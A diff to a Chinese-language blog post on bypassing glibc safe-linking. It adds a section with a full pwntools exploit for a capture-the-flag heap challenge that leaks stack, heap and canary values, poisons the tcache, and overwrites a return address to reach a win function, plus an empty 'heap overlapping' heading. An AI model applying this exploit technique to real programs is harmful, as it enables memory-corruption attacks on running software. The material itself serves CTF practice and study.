@@ -15,6 +15,8 @@ comments: true
     - [1.2.4 safe-linking 总结](#124-safe-linking-总结)
 - [2. glibc 2.35 safe-linking 绕过](#2-glibc-235-safe-linking-绕过)
   - [2.1 利用malloc/free机制修改某个区间的值,并利用tcachebin机制泄露值](#21-利用mallocfree机制修改某个区间的值并利用tcachebin机制泄露值)
+  - [2.2 劫持栈返回地址](#22-劫持栈返回地址)
+  - [2.3 heap overlapping](#23-heap-overlapping)
 
 
 # 1. glibc 2.32 safe-linking<br>
@@ -170,6 +172,85 @@ send_flag(p64(secret_demangled2)+b"\x00"*8)
 
 p.interactive()
 ```
+
+## 2.2 劫持栈返回地址<br>
+**拥有任意地址读写的能力并知道heap、stack、program的基地址后，直接写返回地址即可**<br>
+```python
+from pwn import *
+context.log_level = 'debug'
+context.arch = 'amd64'
+context.os = 'linux'
+
+binary_path = './babyheap_level17.1'
+libc_path = './libc.so.6'
+
+p = process(binary_path)
+
+def malloc(idx,size):
+    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/quit):")
+    p.sendline(b"malloc")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"Size: ")
+    p.sendline(str(size).encode())
+
+def free(idx):
+    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/quit):")
+    p.sendline(b"free")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+
+def puts(idx):
+    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/quit):")
+    p.sendline(b"puts")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+
+def scanf(idx,content):
+    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/quit):")
+    p.sendline(b"scanf")
+    p.recvuntil(b"Index: ")
+    p.sendline(str(idx).encode())
+    sleep(0.1)
+    p.sendline(content)
+
+p.recvuntil(b"[LEAK] The local stack address of your allocations is at: ")
+stack_addr = int(p.recvline().strip(b".\n"),16)
+log.success(f"stack_addr: {hex(stack_addr)}")
+p.recvuntil(b"[LEAK] The address of main is at: ")
+main_addr = int(p.recvline().strip(b".\n"),16)
+log.success(f"main_addr: {hex(main_addr)}")
+win_addr = main_addr - 0x151B+ 0x1400
+
+malloc(0,0x20)
+malloc(1,0x20)
+free(0)
+puts(0)
+p.recvuntil(b"Data: ") # get heap_base addr
+heap_base = u64(p.recvline().strip(b"\n").ljust(8,b"\x00")) << 12
+log.success(f"heap_base: {hex(heap_base)}")
+
+free(1) # 1-> 0
+scanf(1,p64(stack_addr ^ (heap_base>>12)))
+malloc(2,0x20)
+# gdb.attach(p,"b *$rebase(0x1AE1)")
+# pause()
+malloc(3,0x20) # now 3 is the pointer to heap_array
+scanf(3,p64(stack_addr+0x128 - 0x10+1)) # heap_array 
+puts(0) # leak canary
+# pause()
+p.recvuntil(b"Data: ")
+canary = u64(p.recv(7).rjust(8,b"\x00"))
+log.success(f"canary: {hex(canary)}")
+# pause()
+scanf(3,p64(stack_addr+0x128 - 0x10))  # now 0 is the pointer to main_ret_addr -0x10
+scanf(0,p64(canary)+p64(0)+p64(win_addr))
+
+p.interactive()
+```
+
+## 2.3 heap overlapping<br>
+
 
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
